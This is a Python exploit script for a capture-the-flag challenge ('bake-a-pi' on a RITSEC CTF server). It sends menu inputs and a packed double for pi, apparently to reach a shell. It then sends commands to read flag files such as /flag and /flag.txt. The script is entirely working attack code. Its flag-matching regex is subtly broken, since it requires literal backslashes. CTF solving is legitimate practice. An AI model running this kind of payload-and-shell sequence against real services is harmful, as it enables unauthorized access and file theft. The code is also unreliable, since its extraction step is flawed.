#!/usr/bin/env python3
import re
import socket
import struct
import sys
import time


HOST = sys.argv[1] if len(sys.argv) > 1 else "bake-a-pi.ctf.ritsec.club"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1555


def recv_all(sock: socket.socket, idle_timeout: float = 0.5) -> bytes:
    sock.settimeout(idle_timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
        except TimeoutError:
            break
        if not chunk:
            break
        data += chunk
    return data


def main() -> None:
    with socket.create_connection((HOST, PORT)) as sock:
        payload = struct.pack("<Q", 0x400921FB54442D18)  # pi as a double

        time.sleep(0.2)
        sock.sendall(b"C\n")
        time.sleep(0.2)
        sock.sendall(b"8\n")
        time.sleep(0.2)
        sock.sendall(payload + b"\n")
        time.sleep(0.2)
        sock.sendall(b"T\n")
        time.sleep(0.3)
        sock.sendall(b"cat flag* 2>/dev/null\n")
        time.sleep(0.2)
        sock.sendall(b"cat /flag 2>/dev/null\n")
        time.sleep(0.2)
        sock.sendall(b"cat /flag.txt 2>/dev/null\n")

        output = recv_all(sock)
        sys.stdout.buffer.write(output)
        sys.stdout.buffer.flush()

        match = re.search(rb"RS\\{[^}]+\\}", output)
        if match:
            print(f"\nFLAG: {match.group(0).decode()}")


if __name__ == "__main__":
    main()
